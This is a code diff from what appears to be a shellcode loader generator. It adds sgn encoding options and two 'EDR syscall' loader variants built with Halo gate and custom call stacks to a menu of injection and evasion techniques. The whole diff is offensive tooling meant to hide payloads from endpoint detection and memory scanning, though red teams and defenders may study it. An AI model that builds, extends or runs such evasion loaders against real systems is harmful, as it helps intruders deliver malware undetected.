@@ -125,14 +125,15 @@ def generate_shellcode(input_exe, output_path, shellcode_type, encode=False, enc
     if encode:
         random_count = random.randint(1, 100)  # Generate a random count between 1 and 100
         encoded_output_path = output_path + "1.bin"  # Specify the encoded output file path
-        encode_cmd = ['./encoders/sgn', '-a', '64', '-i', output_path + ".bin", '-o', encoded_output_path]
+        encode_cmd = ['./encoders/sgn', '-a', '64', '-S', '--enc=20', '-v', '-i', output_path + ".bin", '-o', encoded_output_path]
         # encode_cmd = ['./sgn', '-a', '64', '-v', '-c', str(random_count), '-i', output_path + ".bin", '-o', encoded_output_path]
         try:
             subprocess.run(encode_cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            print(f"Shellcode successfully encoded with {random_count} iterations.")
-            print(f"Encoded shellcode saved to: {encoded_output_path}")
+            # subprocess.run(encode_cmd, check=True)
+            print(f"[+] Shellcode successfully encoded with {random_count} iterations.")
+            print(f"[!] Encoded shellcode saved to: {encoded_output_path}")
         except subprocess.CalledProcessError:
-            print("Shellcode encoding failed.")       
+            print("[-] Shellcode encoding failed.")       
         output_path_bin = encoded_output_path
     else:
         # If not encoding, keep using the original .bin file
@@ -840,8 +841,8 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
         except subprocess.CalledProcessError as e:
             print(f"[-] NASM assembly compilation failed: {e}")
             return  # Exit the function if NASM compilation fails
-    if loader_number in [29, 30]:
-        asm_file = 'indirect_syscall.asm' if loader_number == 29 else 'direct_syscall.asm'
+    if loader_number in [29, 30, 34, 36]:
+        asm_file = 'direct_syscall.asm' if loader_number == 30 else 'edr_syscall_1.asm' if loader_number == 34 else 'edr_syscall_2.asm' if loader_number == 36 else 'indirect_syscall.asm'
         try:
             subprocess.run(['nasm', '-f', 'win64', asm_file, '-o', 'assembly.o'], check=True)
             print(f"[+] NASM compilation of '{asm_file}' successful.")
@@ -970,7 +971,7 @@ def compile_output(loader_path, output_name, compiler, sleep_flag, anti_emulatio
     if loader_number == 33: 
         compile_command.append('./syscall.c')
         compile_command.append('assembly.o')
-    if loader_number in [1, 29, 30, 39, 40, 41, 66]:
+    if loader_number in [1, 29, 30, 34, 36, 39, 40, 41, 66]:
 
         compile_command.append('assembly.o')
         compile_command.append('-luuid')
@@ -1278,6 +1279,8 @@ def main():
     31. MAC address injection
     32. Stealth new injection (Advanced)
     33. Indirect Syscall + Halo gate + Custom Call Stack
+    34. EDR syscall no.1 + Halo gate + EDR Call Stack 1
+    36. EDR syscall no.2 + Halo gate + EDR Call Stack 2 
     37. Stealth new loader (Advanced, evade memory scan)
     38. A novel PI with APC write method and phantom DLL overloading execution (CreateThread pointed to a memory address of UNMODIFIED DLL.)
     39. Custom Stack PI (remote) with threadless execution
